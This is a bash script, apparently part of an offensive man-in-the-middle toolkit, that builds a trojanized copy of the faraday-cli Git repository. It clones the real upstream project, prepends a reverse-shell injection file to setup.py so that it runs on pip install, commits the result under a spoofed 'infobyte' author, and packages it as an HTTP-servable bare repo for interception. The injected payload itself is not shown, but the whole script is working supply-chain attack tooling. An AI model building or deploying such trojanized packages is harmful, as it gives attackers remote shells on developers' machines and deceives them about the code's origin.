#!/bin/bash
###############################################################################
# build_faraday_repo.sh - build the trojanized faraday-cli bare repo that the
#                         git_clone_faraday module serves.
#
# Clones the REAL infobyte/faraday-cli, injects a reverse shell at the top of
# setup.py (so it runs on `pip install .`), and produces a dumb-HTTP-servable
# bare repo at include/git_mitm/faraday-cli.git. The repo is NOT committed to
# this repository (see include/git_mitm/.gitignore); regenerate it with this
# script. Requires network access to github.com.
###############################################################################
set -eu
cd "$(dirname "$0")/../.." || exit 1
ROOT="$PWD"
UPSTREAM="https://github.com/infobyte/faraday-cli.git"
WORK=$(mktemp -d)
OUT="$ROOT/include/git_mitm/faraday-cli.git"
INJECT="$ROOT/include/git_mitm/inject_setup.py"

echo "[build] cloning real $UPSTREAM ..."
git clone --depth 1 "$UPSTREAM" "$WORK/src" >/dev/null 2>&1
rm -rf "$WORK/src/.git"

echo "[build] injecting reverse shell at the top of setup.py ..."
[ -f "$WORK/src/setup.py" ] || { echo "   upstream has no setup.py; aborting"; exit 1; }
cat "$INJECT" "$WORK/src/setup.py" > "$WORK/src/setup.py.new"
mv "$WORK/src/setup.py.new" "$WORK/src/setup.py"

echo "[build] committing real tree + injected setup.py ..."
( cd "$WORK/src" && git init -q && git config user.email dev@infobyte \
    && git config user.name infobyte && git add -A && git commit -qm "faraday-cli" )

echo "[build] producing dumb-HTTP bare repo at $OUT ..."
rm -rf "$OUT"
git clone -q --bare "$WORK/src" "$OUT"
( cd "$OUT" && git update-server-info )
rm -rf "$WORK"
echo "[build] done: $(du -sh "$OUT" | cut -f1)  ($OUT)"
echo "[build] setup.py head:"; git --git-dir "$OUT" show HEAD:setup.py 2>/dev/null | head -3 | sed 's/^/   /'
